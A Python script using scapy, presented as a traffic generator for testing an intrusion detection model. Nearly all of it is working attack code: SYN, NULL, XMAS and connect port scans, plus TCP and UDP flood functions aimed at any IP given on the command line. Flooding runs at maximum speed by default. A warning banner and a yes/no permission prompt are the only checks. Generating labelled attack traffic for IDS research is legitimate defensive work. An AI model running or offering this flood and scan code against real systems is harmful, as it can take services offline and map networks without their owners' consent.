#!/usr/bin/python3
"""
Attack Traffic Generator
Generates attack traffic (SYN flood, UDP flood, port scan) for testing IDS
All generated traffic is classified as 'Attack' by the binary IDS model
WARNING: Only use on systems you own or have permission to test!
"""

from scapy.all import *
import random
import argparse
import time
import logging
from threading import Thread

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

class AttackGenerator:
    def __init__(self, target_ip, target_port=80):
        self.target_ip = target_ip
        self.target_port = target_port
        self.running = False
    
    def port_scan(self, start_port=1, end_port=1024, scan_type='syn'):
        """
        Generate port scan attack
        
        Args:
            start_port: Starting port number
            end_port: Ending port number
            scan_type: Type of scan ('syn', 'connect', 'null', 'xmas')
        """
        logging.info(f"Starting {scan_type.upper()} Port Scan on {self.target_ip}")
        logging.info(f"Scanning ports {start_port} to {end_port}")
        
        self.running = True
        scanned = 0
        
        try:
            for port in range(start_port, end_port + 1):
                if not self.running:
                    break
                
                try:
                    if scan_type == 'syn':
                        # SYN scan
                        packet = IP(dst=self.target_ip)/TCP(dport=port, flags='S')
                        send(packet, verbose=0)
                    
                    elif scan_type == 'connect':
                        # Full TCP connect
                        packet = IP(dst=self.target_ip)/TCP(dport=port, flags='S')
                        response = sr1(packet, timeout=0.5, verbose=0)
                        if response and response.haslayer(TCP):
                            if response[TCP].flags == 0x12:  # SYN-ACK
                                # Send ACK to complete handshake
                                ack_packet = IP(dst=self.target_ip)/TCP(dport=port, flags='A')
                                send(ack_packet, verbose=0)
                                # Send RST to close
                                rst_packet = IP(dst=self.target_ip)/TCP(dport=port, flags='R')
                                send(rst_packet, verbose=0)
                    
                    elif scan_type == 'null':
                        # NULL scan (no flags set)
                        packet = IP(dst=self.target_ip)/TCP(dport=port, flags='')
                        send(packet, verbose=0)
                    
                    elif scan_type == 'xmas':
                        # XMAS scan (FIN, PSH, URG flags)
                        packet = IP(dst=self.target_ip)/TCP(dport=port, flags='FPU')
                        send(packet, verbose=0)
                    
                    scanned += 1
                    
                    if scanned % 100 == 0:
                        logging.info(f"Scanned {scanned} ports...")
                    
                    time.sleep(0.01)  # Small delay to avoid overwhelming
                    
                except Exception as e:
                    logging.error(f"Error scanning port {port}: {e}")
                    continue
            
            logging.info(f"Port scan completed! Scanned {scanned} ports")
            
        except KeyboardInterrupt:
            logging.info("\nPort scan stopped by user")
        except Exception as e:
            logging.error(f"Error during port scan: {e}")
        finally:
            self.running = False
    
    def dos_tcp_flood(self, duration=60, rate=100, flood_type='syn'):
        """
        Generate TCP-based DoS attack
        
        Args:
            duration: Attack duration in seconds
            rate: Packets per second (0 for flood mode)
            flood_type: Type of flood ('syn', 'ack', 'rst', 'fin')
        """
        logging.info(f"Starting {flood_type.upper()} TCP Flood Attack")
        logging.info(f"Target: {self.target_ip}:{self.target_port}")
        logging.info(f"Duration: {duration} seconds")
        if rate > 0:
            logging.info(f"Rate: {rate} packets/second")
        else:
            logging.info(f"Mode: FLOOD (maximum speed)")
        
        self.running = True
        start_time = time.time()
        packet_count = 0
        
        try:
            # Set TCP flags based on flood type
            if flood_type == 'syn':
                flags = 'S'
            elif flood_type == 'ack':
                flags = 'A'
            elif flood_type == 'rst':
                flags = 'R'
            elif flood_type == 'fin':
                flags = 'F'
            else:
                flags = 'S'
            
            while self.running and (time.time() - start_time) < duration:
                try:
                    # Randomize source port for variety
                    src_port = random.randint(1024, 65535)
                    
                    # Create packet
                    packet = IP(dst=self.target_ip)/TCP(
                        sport=src_port,
                        dport=self.target_port,
                        flags=flags,
                        seq=random.randint(0, 4294967295)
                    )
                    
                    send(packet, verbose=0)
                    packet_count += 1
                    
                    if packet_count % 1000 == 0:
                        elapsed = time.time() - start_time
                        logging.info(f"Sent {packet_count} packets in {elapsed:.2f}s "
                                   f"({packet_count/elapsed:.2f} pps)")
                    
                    # Rate limiting
                    if rate > 0:
                        time.sleep(1.0 / rate)
                
                except Exception as e:
                    logging.error(f"Error sending packet: {e}")
                    continue
            
            elapsed = time.time() - start_time
            logging.info(f"\nTCP Flood completed!")
            logging.info(f"Total packets sent: {packet_count}")
            logging.info(f"Average rate: {packet_count/elapsed:.2f} packets/second")
            
        except KeyboardInterrupt:
            logging.info("\nTCP flood stopped by user")
        except Exception as e:
            logging.error(f"Error during TCP flood: {e}")
        finally:
            self.running = False
    
    def dos_udp_flood(self, duration=60, rate=100, payload_size=1024):
        """
        Generate UDP flood attack
        
        Args:
            duration: Attack duration in seconds
            rate: Packets per second (0 for flood mode)
            payload_size: Size of UDP payload in bytes
        """
        logging.info(f"Starting UDP Flood Attack")
        logging.info(f"Target: {self.target_ip}:{self.target_port}")
        logging.info(f"Duration: {duration} seconds")
        logging.info(f"Payload size: {payload_size} bytes")
        if rate > 0:
            logging.info(f"Rate: {rate} packets/second")
        else:
            logging.info(f"Mode: FLOOD (maximum speed)")
        
        self.running = True
        start_time = time.time()
        packet_count = 0
        
        try:
            # Generate random payload
            payload = ''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') 
                            for _ in range(payload_size))
            
            while self.running and (time.time() - start_time) < duration:
                try:
                    # Randomize source port
                    src_port = random.randint(1024, 65535)
                    
                    # Create UDP packet
                    packet = IP(dst=self.target_ip)/UDP(
                        sport=src_port,
                        dport=self.target_port
                    )/Raw(load=payload)
                    
                    send(packet, verbose=0)
                    packet_count += 1
                    
                    if packet_count % 1000 == 0:
                        elapsed = time.time() - start_time
                        logging.info(f"Sent {packet_count} packets in {elapsed:.2f}s "
                                   f"({packet_count/elapsed:.2f} pps)")
                    
                    # Rate limiting
                    if rate > 0:
                        time.sleep(1.0 / rate)
                
                except Exception as e:
                    logging.error(f"Error sending packet: {e}")
                    continue
            
            elapsed = time.time() - start_time
            logging.info(f"\nUDP Flood completed!")
            logging.info(f"Total packets sent: {packet_count}")
            logging.info(f"Average rate: {packet_count/elapsed:.2f} packets/second")
            logging.info(f"Total data sent: {packet_count * payload_size / 1024 / 1024:.2f} MB")
            
        except KeyboardInterrupt:
            logging.info("\nUDP flood stopped by user")
        except Exception as e:
            logging.error(f"Error during UDP flood: {e}")
        finally:
            self.running = False
    
    def stop(self):
        """Stop the attack"""
        self.running = False
        logging.info("Stopping attack...")


def main():
    parser = argparse.ArgumentParser(
        description='Attack Traffic Generator for IDS Testing (Binary: BENIGN vs Attack)',
        epilog='WARNING: Only use on systems you own or have permission to test!'
    )
    
    parser.add_argument('target_ip',
                       help='Target IP address')
    
    parser.add_argument('-p', '--port',
                       type=int,
                       default=80,
                       help='Target port (default: 80)')
    
    parser.add_argument('-a', '--attack',
                       choices=['portscan', 'tcp-flood', 'udp-flood'],
                       required=True,
                       help='Attack method: portscan, tcp-flood, or udp-flood (all classified as Attack)')
    
    # Port Scan options
    parser.add_argument('--start-port',
                       type=int,
                       default=1,
                       help='Start port for scan (default: 1)')
    
    parser.add_argument('--end-port',
                       type=int,
                       default=1024,
                       help='End port for scan (default: 1024)')
    
    parser.add_argument('--scan-type',
                       choices=['syn', 'connect', 'null', 'xmas'],
                       default='syn',
                       help='Port scan type (default: syn)')
    
    # DoS options
    parser.add_argument('-d', '--duration',
                       type=int,
                       default=60,
                       help='Attack duration in seconds (default: 60)')
    
    parser.add_argument('-r', '--rate',
                       type=int,
                       default=0,
                       help='Packets per second (0 for flood mode, default: 0)')
    
    parser.add_argument('--flood-type',
                       choices=['syn', 'ack', 'rst', 'fin'],
                       default='syn',
                       help='TCP flood type (default: syn)')
    
    parser.add_argument('--payload-size',
                       type=int,
                       default=1024,
                       help='UDP payload size in bytes (default: 1024)')
    
    args = parser.parse_args()
    
    # Warning message
    print("\n" + "="*70)
    print("⚠️  WARNING: ATTACK TRAFFIC GENERATOR")
    print("="*70)
    print("This tool generates attack traffic for testing the binary IDS.")
    print("All generated traffic will be classified as 'Attack' by the model.")
    print("Only use on systems you own or have explicit permission to test!")
    print("="*70)
    
    response = input("\nDo you have permission to test this system? (yes/no): ")
    if response.lower() != 'yes':
        print("Exiting...")
        return
    
    print("\n")
    
    # Create attack generator
    generator = AttackGenerator(args.target_ip, args.port)
    
    try:
        if args.attack == 'portscan':
            generator.port_scan(
                start_port=args.start_port,
                end_port=args.end_port,
                scan_type=args.scan_type
            )
        
        elif args.attack == 'tcp-flood':
            generator.dos_tcp_flood(
                duration=args.duration,
                rate=args.rate,
                flood_type=args.flood_type
            )
        
        elif args.attack == 'udp-flood':
            generator.dos_udp_flood(
                duration=args.duration,
                rate=args.rate,
                payload_size=args.payload_size
            )
    
    except KeyboardInterrupt:
        print("\n\nStopping attack...")
        generator.stop()
    except Exception as e:
        logging.error(f"Error: {e}")


if __name__ == "__main__":
    main()
